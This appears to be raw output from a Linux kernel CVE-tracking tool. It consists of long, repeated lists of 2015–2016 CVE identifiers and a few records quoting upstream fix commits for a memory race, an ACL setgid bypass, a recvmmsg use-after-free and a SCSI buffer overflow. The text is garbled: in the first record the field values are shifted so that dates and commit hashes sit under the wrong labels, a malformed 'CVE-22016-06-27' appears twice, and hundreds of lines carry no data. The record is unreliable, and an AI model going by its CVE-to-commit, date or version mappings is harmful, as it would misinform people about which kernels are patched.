CVE-2015-1333:
CVE-2015-1339:
CVE-2015-1420:
CVE-2015-1421:
CVE-2015-1465:
CVE-2015-1573:
CVE-2015-1593:
CVE-2015-1805:
CVE-2015-1805:
CVE-2015-2041:
CVE-2015-2042:
CVE-2015-2150:
CVE-2015-2666:
CVE-2015-2672:
CVE-2015-2686:
CVE-2015-2830:
CVE-2015-2922:
CVE-2015-2925:
CVE-2015-2925:
CVE-2015-3212:
CVE-2015-3288:
CVE-2015-3290:
CVE-2015-3291:
CVE-2015-3331:
CVE-2015-3332:
CVE-2015-3636:
CVE-2015-4001:
CVE-2015-4002:
CVE-2015-4002:
CVE-2015-4003:
CVE-2015-4004:
CVE-2015-4036:
CVE-2015-4167:
CVE-2015-4176:
CVE-2015-4177:
CVE-2015-4178:
CVE-2015-4692:
CVE-2015-4700:
CVE-2015-5156:
CVE-2015-5157:
CVE-2015-5257:
CVE-2015-5283:
CVE-2015-5307:
CVE-2015-5327:
CVE-2015-5364:
CVE-2015-5366:
CVE-2015-5697:
CVE-2015-5706:
CVE-2015-5707:
CVE-2015-5707:
CVE-2015-6252:
CVE-2015-6526:
CVE-2015-6937:
CVE-2015-7312:
CVE-2015-7513:
CVE-2015-7515:
CVE-2015-7550:
CVE-2015-7566:
CVE-2015-7613:
CVE-2015-7799:
CVE-2015-7799:
CVE-2015-7833:
CVE-2015-7833:
CVE-2015-7837:
CVE-2015-7872:
CVE-2015-7884:
CVE-2015-7885:
CVE-2015-7990:
CVE-2015-8019:
CVE-2015-8104:
CVE-2015-8215:
CVE-2015-8374:
CVE-2015-8539:
CVE-2015-8543:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8569:
CVE-2015-8575:
CVE-2015-8660:
CVE-2015-8709:
CVE-2015-8746:
CVE-2015-8767:
CVE-2015-8785:
CVE-2015-8787:
CVE-2015-8812:
CVE-2015-8816:
CVE-2015-8830:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8844:
CVE-2015-8845:
CVE-2015-8944:
CVE-2015-8950:
CVE-2015-8952:
CVE-2015-8953:
CVE-2015-8955:
CVE-2015-8956:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2016-0617:
CVE-2016-0723:
CVE-2016-0728:
CVE-2016-0758:
CVE-2016-0774:
CVE-2016-0821:
CVE-2016-0823:
CVE-2016-1237:
CVE-2016-1237:
CVE-2016-1575:
CVE-2016-1575:
CVE-2016-1576:
CVE-2016-1576:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-2053:
CVE-2016-2069:
CVE-2016-2069:
CVE-2016-2070:
CVE-2016-2085:
CVE-2016-2117:
CVE-2016-2143:
CVE-2016-2184:
CVE-2016-2184:
CVE-2016-2185:
CVE-2016-2186:
CVE-2016-2187:
CVE-2016-2188:
CVE-2016-2383:
CVE-2016-2384:
CVE-2016-2543:
CVE-2016-2544:
CVE-2016-2545:
CVE-2016-2546:
CVE-2016-2547:
CVE-2016-2548:
CVE-2016-2549:
CVE-2016-2550:
CVE-2016-2782:
CVE-2016-2847:
CVE-2016-3070:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3135:
CVE-2016-3136:
CVE-2016-3137:
CVE-2016-3138:
CVE-2016-3140:
CVE-2016-3156:
CVE-2016-3157:
CVE-2016-3672:
CVE-2016-3689:
CVE-2016-3713:
CVE-2016-3841:
CVE-2016-3857:
CVE-2016-3951:
CVE-2016-3951:
CVE-2016-3955:
CVE-2016-3961:
CVE-2016-4440:
CVE-2016-4470:
CVE-2016-4482:
CVE-2016-4485:
CVE-2016-4486:
CVE-2016-4557:
CVE-2016-4558:
CVE-2016-4565:
CVE-2016-4569:
CVE-2016-4578:
CVE-2016-4578:
CVE-2016-4580:
CVE-2016-4581:
CVE-2016-4794:
CVE-2016-4794:
CVE-2016-4805:
CVE-2016-4913:
CVE-2016-4951:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2012-09-28:
CVE-2016-8666:
2016-09-07:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.2:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
43761473c254b45883a64441dd0bc85a42f3645c:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.8:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
30a46a4647fd1df9cf52e43bf467f0d9265096ca:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-22016-06-27:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
3.15:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
ff19f63ed47309550b47831ac39176d9910fadfe:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2016-07-08:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
9bf292bfca94694a721449e3fd752493856710f6:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
1a1a143daf84db95dd7212086042004a3abb7bc2:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
*************

*** This is a new CVE ***
This CVE has been resolved in 09a2499466dc69d1e54e8e879d4591cdd0ca17c8.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Author: Andrea Arcangeli <aarcange@redhat.com>
Date:   Fri Feb 26 15:19:28 2016 -0800

    mm: thp: fix SMP race condition between THP page fault and MADV_DONTNEED
    
    commit ad33bb04b2a6cee6c1f99fabb15cddbf93ff0433 upstream.
    
    pmd_trans_unstable()/pmd_none_or_trans_huge_or_clear_bad() were
    introduced to locklessy (but atomically) detect when a pmd is a regular
    (stable) pmd or when the pmd is unstable and can infinitely transition
    from pmd_none() and pmd_trans_huge() from under us, while only holding
    the mmap_sem for reading (for writing not).
    
    While holding the mmap_sem only for reading, MADV_DONTNEED can run from
    under us and so before we can assume the pmd to be a regular stable pmd
    we need to compare it against pmd_none() and pmd_trans_huge() in an
    atomic way, with pmd_trans_unstable().  The old pmd_trans_huge() left a
    tiny window for a race.
    
    Useful applications are unlikely to notice the difference as doing
    MADV_DONTNEED concurrently with a page fault would lead to undefined
    behavior.
    
    [js] 3.12 backport: no pmd_devmap in 3.12 yet.
    
    [akpm@linux-foundation.org: tidy up comment grammar/layout]
    Signed-off-by: Andrea Arcangeli <aarcange@redhat.com>
    Reported-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>
    Signed-off-by: Andrew Morton <akpm@linux-foundation.org>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Vlastimil Babka <vbabka@suse.cz>
    Signed-off-by: Jiri Slaby <jslaby@suse.cz>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 mm/memory.c |   14 ++++++++++++--
 1 file changed, 12 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: -
CVE: 2016-09-11
Break Date: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Break Commit: 3.14.79
Break Tag: -
Linus Fix Date: 2016-09-11
Linus Commit: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8
Linus Tag: 3.14.79
Stable Date: -
Stable Commit: 2016-09-11
Stable Tag: 09a2499466dc69d1e54e8e879d4591cdd0ca17c8

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
